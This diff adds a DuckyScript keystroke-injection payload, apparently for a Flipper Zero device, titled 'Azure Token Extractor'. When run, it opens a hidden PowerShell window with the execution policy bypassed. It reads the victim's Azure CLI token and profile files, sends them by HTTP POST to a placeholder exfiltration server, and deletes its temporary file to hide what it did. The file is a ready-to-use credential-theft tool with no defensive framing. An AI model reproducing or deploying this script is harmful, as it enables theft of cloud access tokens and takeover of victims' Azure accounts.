@@ -1,0 +1,17 @@
+REM ===============================================================
+REM Azure Token Extractor - NullSec Flipper Suite
+REM Extracts Azure CLI tokens and credentials
+REM ===============================================================
+REM Target: Windows/Linux/macOS with Azure CLI
+REM Author: bad-antics
+REM ===============================================================
+
+GUI r
+DELAY 200
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING $tokens = @(); $azPath = "$env:USERPROFILE\.azure"; if(Test-Path "$azPath\accessTokens.json"){$tokens += Get-Content "$azPath\accessTokens.json"}; if(Test-Path "$azPath\azureProfile.json"){$tokens += Get-Content "$azPath\azureProfile.json"}; $tokens | Out-File "$env:TEMP\az.txt"; Invoke-WebRequest -Uri "http://EXFIL_SERVER/azure" -Method POST -Body (Get-Content "$env:TEMP\az.txt" -Raw); Remove-Item "$env:TEMP\az.txt"
+ENTER
+STRING exit
+ENTER
